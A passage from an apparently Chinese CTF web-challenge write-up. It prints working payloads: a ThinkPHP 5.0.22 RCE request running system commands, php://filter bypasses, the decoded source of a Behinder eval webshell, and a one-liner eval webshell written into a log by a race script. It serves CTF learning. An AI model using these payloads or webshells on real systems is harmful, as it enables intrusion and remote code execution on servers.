<strong>第二关</strong>利用PHP处理哈希字符串时会把”0E”开头的哈希值解释为0，所以选择两个值在md5加密后是以0E开头即可。payload：<code>v1=QNKCDZO&amp;v2=240610708</code>，这篇博客中还进一步的讲解了一些<a href=\"https://blog.csdn.net/qq_19980431/article/details/83018232\">md5函数的漏洞</a>。</p>\n<p> <strong>第三关</strong>进行<code>$message-&gt;key</code>和<code>$key</code>进行判断，<code>$key</code>之前没有声明过故值为空，所以传入的<code>message</code>也为空即可。post中传入<code>message=</code> 即可。</p>\n<p><strong>完整payload</strong>：</p>\n<p>url: <code>http://dmctf.vaala.cloud:28113/?num=202020020a&amp;v1=QNKCDZO&amp;v2=240610708</code></p>\n<p>post: <code>message=</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129202453.png\" alt=\"img\"></p>\n<h2 id=\"thinkphp\"><a href=\"#thinkphp\" class=\"headerlink\" title=\"thinkphp\"></a>thinkphp</h2><p> 看到框架首先去搜索框架的漏洞，参考了[<a href=\"https://blog.csdn.net/qq_37865996/article/details/107468816\">框架漏洞]Thinkphp系列漏洞【截至2020-07-20】</a></p>\n<p> 这道题利用ThinkPHP5.0.22版本的漏洞可以执行远程代码。Thinkphp在实现框架中的核心类Request的method方法实现了表单请求伪装。但由于对<code>$_POST[‘_method’]</code>属性校验不严格，导致攻击者可以通过变量覆盖掉Request类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。</p>\n<p>测试payload：</p>\n<p><strong>url</strong>： <code>?s=captcha</code></p>\n<p><strong>post</strong>： <code>_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></p>\n<p>虽然报错但是最上方输出了<code>www-data</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203051.png\" alt=\"img\"></p>\n<p>根据题目中的提示<strong>flag在环境变量中</strong>，所以在网上查询linux系统输出环境变量的语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SHELL</span><br><span class=\"line\">env</span><br></pre></td></tr></table></figure>\n\n<p>最终获取到flag的payload：</p>\n<p>url： <code>?s=captcha</code></p>\n<p>post： <code>_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=env</code></p>\n<p>在输出末尾即是flag。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203818.png\" alt=\"img\"></p>\n<h2 id=\"fungame\"><a href=\"#fungame\" class=\"headerlink\" title=\"fungame\"></a>fungame</h2><p> 打开是个游戏当然要玩一玩了在线地址：<a href=\"https://justdui.github.io/%E3%80%82\">https://justdui.github.io/。</a></p>\n<p>我先下了源码到本地康一康，查看源码在<code>game.js</code>中第122行中：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JAVASCRIPT</span><br><span class=\"line\">nextLevel = (nextLevel+1)%11;</span><br></pre></td></tr></table></figure>\n\n<p> <code>nextlevel</code>根据变量名猜想是下一关的值，直接一个一个试，发现第10关入场动画不同，而且又一个大波斯，感觉就是最后一关，再将代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JAVASCRIPT</span><br><span class=\"line\">class PlayerData</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    // track player data between levels (when player is destroyed)</span><br><span class=\"line\">    constructor()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        this.health = 3;</span><br><span class=\"line\">        this.healthMax = 3;</span><br><span class=\"line\">        this.boomerangs = 1;</span><br><span class=\"line\">        this.bigBoomerangs = 0;</span><br><span class=\"line\">        this.coins = 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p> 人物属性值中的<code>health</code>、<code>healthMax</code>、<code>bigBoomerangs</code>数量修改为9999，三个对应的属性值分别为：生命值、生命上限、大型飞镖。当然修改以后代码不会直接生效，需要随便进一关自杀游戏reload一下。</p>\n<p> 击杀第10关波斯出现flag，但是界面过小无法完整显示，按下Ctrl+滚轮调整浏览器缩放比例，获得flag。这题其实第一次做出来的时候不是这个方法，但是写题解的时候是在复现不出来了0.0</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129204724.jpg\" alt=\"img\"></p>\n<h2 id=\"bingxie\"><a href=\"#bingxie\" class=\"headerlink\" title=\"bingxie\"></a>bingxie</h2><p> 首先根据提示：<strong>你需要一些特殊软件</strong>，再看题目联想到<a href=\"https://github.com/rebeyond/Behinder/releases\">Behinder</a>，首先下载工具。</p>\n<p>分析题目：</p>\n<p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">function filter($file) //hint in bingxie.php</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $file = strtolower($file);</span><br><span class=\"line\">    $file = str_replace(&#x27;php&#x27;, &quot;&quot;, $file);</span><br><span class=\"line\">    $file = str_replace(&#x27;data&#x27;, &quot;???&quot;, $file);</span><br><span class=\"line\">    $file = str_replace(&#x27;http&#x27;, &quot;???&quot;, $file);</span><br><span class=\"line\">    $file = str_replace(&#x27;file&#x27;, &quot;???&quot;, $file);</span><br><span class=\"line\">    $file = str_replace(&#x27;input&#x27;, &quot;???&quot;, $file);</span><br><span class=\"line\">    $file = str_replace(&#x27;filter&#x27;, &quot;&quot;, $file);</span><br><span class=\"line\">    $file = str_replace(&#x27;log&#x27;,&quot;???&quot;,$file);</span><br><span class=\"line\">    return $file;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file = $_GET[&#x27;file&#x27;];</span><br><span class=\"line\">$md5 =substr(md5($_GET[&#x27;md5&#x27;]),0,6);</span><br><span class=\"line\"></span><br><span class=\"line\">$file = filter($file);</span><br><span class=\"line\">if ($md5==&#x27;e95100&#x27;)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  include $file;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p> 代码16、17行使用GET方法获得<code>file</code>和<code>md5</code>参数，<code>file</code>经过filter函数过滤一些PHP协议，<code>md5</code>参数进行md5加密并截取前6位，判断是否为<code>e95100</code>，如果判定成功include包含<code>file</code>变量指定的文件。</p>\n<p> 首先计算什么数进行md5加密后前六位是<code>e95100</code>。参考了<a href=\"https://stackoverflow.com/questions/21636042/getting-md5-with-certain-character-pattern\">Getting MD5 with certain character pattern</a>中的回答，使用脚本：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PYTHON</span><br><span class=\"line\">import hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">target = &#x27;e95100&#x27;</span><br><span class=\"line\">candidate = 0</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    plaintext = str(candidate)</span><br><span class=\"line\">    hash = hashlib.md5(plaintext.encode(&#x27;ascii&#x27;)).hexdigest()</span><br><span class=\"line\">    if hash[:6] == target:</span><br><span class=\"line\">        print(&#x27;plaintext:&quot;&#x27; + plaintext + &#x27;&quot;, md5:&#x27; + hash)</span><br><span class=\"line\">        break</span><br><span class=\"line\">    candidate = candidate + 1</span><br></pre></td></tr></table></figure>\n\n<p> 运行之后很快得出md5加密后前六位是<code>e95100</code>的数字是<code>6666</code>。</p>\n<p> 再根据提示<code>hint in bingxie.php</code>，直接访问<code>/bingxie.php</code>只得到一句输出：**no ,you are not a real hacker !!!**说的确实没错，想到使用php协议读取文件内容，因为<code>str_replace</code>函数只进行一次替换，所以在合适的位置进行双写即可绕过。构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">http://网址?md5=6666&amp;file=pphphp://fifilterlter/convert.base64-encode/resource=bingxie.pphphp</span><br></pre></td></tr></table></figure>\n\n<p> 得到base64加密的文件，扔到CyberChef里面解码（附上CyberChef的<a href=\"https://github.com/gchq/CyberChef\">github项目地址</a>）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQovL+WmguaenOaOpeaUtuWIsHBhc3Plj4LmlbDvvIzliJnkvJrnlJ/miJAxNuS9jeeahOmaj+acuuenmOmSpe+8jOWtmOWCqOWIsHNlc3Npb27kuK0NCiRhID0gJF9HRVRbJ2EnXTsNCiRiID0gJF9HRVRbJ2InXTsNCmlmKCRhIT0kYiYmbWQ1KCRhKT09bWQ1KCRiKSkNCnsNCiAgICBlY2hvICJ5b3UgYXJlIHJpZ2h0IjsNCn0NCmVsc2V7DQogICAgZGllKCJubyAseW91IGFyZSBub3QgYSByZWFsIGhhY2tlciAhISEiKTsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydzZWNyZXQnXSkpDQp7DQogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7DQogICAgJF9TRVNTSU9OWydrJ109JGtleTsNCiAgICBwcmludCAka2V5Ow0KfQ0KDQplbHNlDQp7DQogICAgJGtleT0kX1NFU1NJT05bJ2snXTsNCg0KICAgICRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KDQogICAgaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICB7DQogICAgICAgICR0PSJiYXNlNjRfIi4iZGVjb2RlIjsNCiAgICAgICAgJHBvc3Q9JHQoJHBvc3QuIiIpOw0KICAgICAgICANCiAgICAgICAgZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7DQogICAgICAgICAgICAgICAgICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOw0KICAgICAgICAgICAgICAgIH0NCiAgICB9DQoNCiAgICBlbHNlDQogICAgew0KICAgICAgICAkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCiAgICB9DQoNCiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCiAgICBjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319DQoNCiAgICBAbmV3IEMoJHBhcmFtcyk7DQp9DQo/Pg==</span><br></pre></td></tr></table></figure>\n\n<p> 解码后得到一个php文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">@error_reporting(0);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">//如果接收到pass参数，则会生成16位的随机秘钥，存储到session中</span><br><span class=\"line\">$a = $_GET[&#x27;a&#x27;];</span><br><span class=\"line\">$b = $_GET[&#x27;b&#x27;];</span><br><span class=\"line\">if($a!=$b&amp;&amp;md5($a)==md5($b))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    echo &quot;you are right&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    die(&quot;no ,you are not a real hacker !!!&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#x27;secret&#x27;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $key=substr(md5(uniqid(rand())),16);</span><br><span class=\"line\">    $_SESSION[&#x27;k&#x27;]=$key;</span><br><span class=\"line\">    print $key;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $key=$_SESSION[&#x27;k&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    $post=file_get_contents(&quot;php://input&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class=\"line\">        $post=$t($post.&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class=\"line\">                 $post[$i] = $post[$i]^$key[$i+1&amp;15];</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class=\"line\">    $func=$arr[0];</span><br><span class=\"line\">    $params=$arr[1];</span><br><span class=\"line\">    class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @new C($params);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p> 后半部分根据Behinder的<a href=\"https://xz.aliyun.com/t/2774\">官方文档</a>和博客<a href=\"https://blog.csdn.net/weixin_39190897/article/details/109417674\">渗透测试-流量加密之冰蝎&amp;蚁剑</a>的讲解，认为这个文件是个冰蝎马，参考博客中对加密通信流程进行了讲解，链接的密码为第15行<code>$_GET[&#39;secret&#39;]</code>中的<code>secret</code>。但是php文件前半部分（代码第5-13行）还需绕过，看到md5函数可以利用上一题<strong>weak_type</strong>中提到的不同字符串加密后md5相同绕过。最后payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">http://网址/bingxie.php?a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure>\n\n<p>使用Behinder连接。可以在根目录下找到flag。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129210207.png\" alt=\"img\"></p>\n<h2 id=\"filerce\"><a href=\"#filerce\" class=\"headerlink\" title=\"filerce\"></a>filerce</h2><p> 先看提示：<strong>看看log里面存的什么（利用伪协议包含）</strong>，以下是访问后页面：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\">$sandbox = &#x27;/var/www/html/sandbox/&#x27;.md5(&quot;DMCTF&quot;.$_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class=\"line\">mkdir($sandbox,0777,true);</span><br><span class=\"line\">chdir($sandbox);</span><br><span class=\"line\">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class=\"line\">    if (strpos($_GET[&quot;file&quot;], &quot;base64-decode&quot;)) &#123;</span><br><span class=\"line\">        include $_GET[&quot;file&quot;];</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo &quot;Hacker!!!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    echo &quot;get me a file&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">file_put_contents(&quot;thx.log&quot;, base64_encode(&#x27;http://&#x27;.$_SERVER[&#x27;HTTP_HOST&#x27;].urldecode($_SERVER[&#x27;REQUEST_URI&#x27;])));</span><br><span class=\"line\">echo &quot;&lt;br/&gt;&quot;;</span><br><span class=\"line\">echo &quot;You&#x27;ve been recorded in $sandbox/thx.log!!!!&quot;</span><br><span class=\"line\">?&gt; get me a file</span><br><span class=\"line\">You&#x27;ve been recorded in /var/www/html/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log!!!!</span><br></pre></td></tr></table></figure>\n\n<p>使用文件包含查看thx.log有什么，请求访问：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">http://网址?file=php://filter/convert.base64-decode/resource=thx.log</span><br></pre></td></tr></table></figure>\n\n<p> 输出了thx.log文件内容：<code>http://dmctf.vaala.cloud:28236/favicon.ico</code>，访问以后发现还是刚进来的页面。分析17行以下的代码，会打开thx.log文件，在里面写入的内容是<code>http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;].urldecode($_SERVER[&#39;REQUEST_URI&#39;]</code>，也就是我们请求题目页面的url地址，并且多次请求以后发现log中内容成了<code>http://网址?file=php://filter/convert.base64-decode/resource=thx.log</code>。判断为竞争写入导致（因为之前做过竞争上传题目），所以在构造url中写入一句话木马：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">http://网址?file=php://filter/&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;convert.base64-decode/resource=thx.log</span><br></pre></td></tr></table></figure>\n\n<p> 使用python脚本不断写入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PYTHON</span><br><span class=\"line\">#coding=utf-8</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import sys</span><br><span class=\"line\">def CompeteUpload():  #上传页面</span><br><span class=\"line\">    geturl=&quot;http://dmctf.vaala.cloud:28426/?file=php://filter/&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;convert.base64-decode/resource=thx.log&quot;     #访问上传文件</span><br><span class=\"line\">    r1=requests.get(url=geturl)</span><br><span class=\"line\">if __name__==&quot;__main__&quot;:</span><br><span class=\"line\">    i=10;</span><br><span class=\"line\">    while (i&gt;0):</span><br><span class=\"line\">        i-=1;</span><br><span class=\"line\">        CompeteUpload();</span><br></pre></td></tr></table></figure>\n\n<p> 尝试访问<code>http://网址/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log</code>，会下载log文件，使用base64解码以后发现一句话木马存在，直接蚁剑连接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">http://网址?file=php://filter/convert.base64-decode/resource=thx.log</span><br></pre></td></tr></table></figure>\n\n<p>同样在根目录下找到flag。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129224231.png\" alt=\"img\"></p>\n<h2 id=\"do-you-have-a-right-token\"><a href=\"#do-you-have-a-right-token\" class=\"headerlink\" title=\"do_you_have_a_right_token\"></a>do_you_have_a_right_token</h2><p> F12查看网页代码，发现注释中一大段php代码估计就是题目用到的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">session_start();</span><br><span class=\"line\">include &#x27;flag.php&#x27;;</span><br><span class=\"line\">date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);</span><br><span class=\"line\">if(isset($_POST[&#x27;token&#x27;]) &amp;&amp; isset($_SESSION[&#x27;token&#x27;]) &amp;&amp;!empty($_POST[&#x27;token&#x27;])&amp;&amp;!empty($_SESSION[&#x27;token&#x27;]))&#123;</span><br><span class=\"line\">    if($_POST[&#x27;token&#x27;]==$_SESSION[&#x27;token&#x27;])&#123;</span><br><span class=\"line\">        echo &quot;PassResetSuccess! Your Flag is:&quot;.$flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo &quot;Token_error!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    mt_srand(time());</span><br><span class=\"line\"></span><br><span class=\"line\">    $rand= mt_rand();</span><br><span class=\"line\">    $_SESSION[&#x27;token&#x27;]=sha1(md5($rand));</span><br><span class=\"line\">    echo &quot;Token Generate Ok!&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo &#x27;&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;text&quot; name=&quot;token&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;&#x27;;</span><br><span class=\"line\">echo &quot;&lt;!--\\r\\n&quot;.file_get_contents(__FILE__);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p> 分析一波：判断post请求中的<code>token</code>，如果不为空则与<code>$_SESSION[&#39;token&#39;]</code>判断是否相等，相等输出flag，再往下看12-16行，如果为空的话使用当前时间作为随机数的种子，生成一个随机数并进行md5和sha1函数加密并存入<code>$_SESSION[‘token’]</code>。</p>\n<p> 所以思路就是：<strong>我们需要知道生成的那个随机数的值</strong>，在网上搜到参考<a href=\"https://blog.csdn.net/zss192/article/details/104327432\">php伪随机数</a>，可以根据种子预测随机数。题目使用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">mt_srand(time());</span><br></pre></td></tr></table></figure>\n\n<p> 根据第4行设置时区时间并设置随机数种子，所以在本地环境使用相同方法尝试预测随机数，但是还需考虑到本地时间和题目服务器时间不同步问题，我想到的方法是借用之前题目获得的webshell上传php文件对本地时间进行校正：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);</span><br><span class=\"line\">echo time();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211010.png\" alt=\"img\"></p>\n<p>计算时间差为69，所以修改代码跑一遍：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);</span><br><span class=\"line\">// echo time()-69;  这是我验证时间用的</span><br><span class=\"line\">    mt_srand(time()-69);</span><br><span class=\"line\">    $rand = mt_rand();</span><br><span class=\"line\">    echo sha1(md5($rand));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>提交本地运行后得到的密文提交上去就可以获得flag。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211832.png\" alt=\"img\"></p>\n<h2 id=\"pingpingping\"><a href=\"#pingpingping\" class=\"headerlink\" title=\"pingpingping\"></a>pingpingping</h2><p> 进入以后是一个类似终端的界面，随便输几个指令提示：<strong>输入help获得提示</strong>，help以后又提示只能使用test和login，进入test以后提示输入url地址，所以这个才是符合题目的<code>pingpingping</code>，可以使用通道符<code>|</code>连接执行其他命令，搜索到了疑似本题的博客<a href=\"https://www.jianshu.com/p/fd7f9fcc9333\">GXYCTF–PingPingPing</a>，猜测flag很有可能还在根目录下，所以可以执行<code>cat /flag</code>输出，模仿博客中的构造方式把payload进行base64编码，使用sh执行命令，最终payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span 